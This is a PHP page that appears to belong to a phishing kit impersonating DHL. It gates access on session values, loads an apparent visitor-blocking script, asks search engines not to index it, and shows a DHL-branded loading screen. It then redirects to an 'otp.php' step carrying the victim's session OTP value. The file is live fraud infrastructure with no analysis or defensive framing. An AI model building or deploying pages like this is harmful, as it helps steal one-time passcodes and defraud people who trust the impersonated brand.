<?php
   session_start();
   include("./c/ban.php");
   include("./c/sys.php");
   include('../config.php');
   include("lang.php");
   if ( !isset($_SESSION['a']) OR !isset($_SESSION['g']) ) {
      header("Location: ../index.php?#{$rand}");
      die();
   }
?>
<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
      <meta http-equiv="refresh" content="<?php echo $loading_time; ?>; URL= ./otp.php?#<?php echo "{$rand}&f={$_SESSION['otp']}"; ?>">
      <style type="text/css">
         :root {
            --fa-font-solid: normal 900 1em/1 "Font Awesome 6 Solid";
            --fa-font-regular: normal 400 1em/1 "Font Awesome 6 Regular";
            --fa-font-light: normal 300 1em/1 "Font Awesome 6 Light";
            --fa-font-thin: normal 100 1em/1 "Font Awesome 6 Thin";
            --fa-font-duotone: normal 900 1em/1 "Font Awesome 6 Duotone";
            --fa-font-sharp-solid: normal 900 1em/1 "Font Awesome 6 Sharp";
            --fa-font-brands: normal 400 1em/1 "Font Awesome 6 Brands";
         }
         :root {
            --bs-blue: #0d6efd;
            --bs-indigo: #6610f2;
            --bs-purple: #6f42c1;
            --bs-pink: #d63384;
            --bs-red: #dc3545;
            --bs-orange: #fd7e14;
            --bs-yellow: #ffc107;
            --bs-green: #198754;
            --bs-teal: #20c997;
            --bs-cyan: #0dcaf0;
            --bs-white: #fff;
            --bs-gray: #6c757d;
            --bs-gray-dark: #343a40;
            --bs-primary: #0d6efd;
            --bs-secondary: #6c757d;
            --bs-success: #198754;
            --bs-info: #0dcaf0;
            --bs-warning: #ffc107;
            --bs-danger: #dc3545;
            --bs-light: #f8f9fa;
            --bs-dark: #212529;
            --bs-font-sans-serif: c-ui, -apple-c, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", "Liberation Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
            --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
            --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
         }
         *,
         ::after,
         ::before {
            box-sizing: border-box;
         }
         @media (prefers-reduced-motion:no-preference) {
            :root {
               scroll-behavior: smooth;
            }
         }
         body {
            margin: 0;
            font-family: var(--bs-font-sans-serif);
            font-size: 1rem;
            font-weight: 400;
            line-height: 1.5;
            color: #212529;
            background-color: #fff;
            -webkit-text-size-adjust: 100%;
            -webkit-tap-highlight-color: transparent;
         }
         img {
            vertical-align: middle;
         }
         .d-flex {
            display: flex !important;
         }
         .justify-content-center {
            justify-content: center !important;
         }
         body {
            margin: 0;
            padding: 0;
         }
      </style>
      <link rel="icon" type="image/x-icon" href="./f/favicon.ico">
      <title>| DHL |</title>
   </head>
   <body>
      <div>
         <div>
            <div class="">
               <div class="">
                  <div style="color: orange;padding: 100px;">
                     <div class="d-flex justify-content-center">
                        <div>
                           <img src="./f/dhl-logo.svg" class="sfli" style="
                              width: 100px;
                              ">
                        </div>
                     </div>
                     <br>
                     <div class="d-flex justify-content-center">
                        <div>
                           <br>
                           <img src="./f/VIVA.gif" class="sfli" style="
                              width: 60px;
                              ">
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
</html>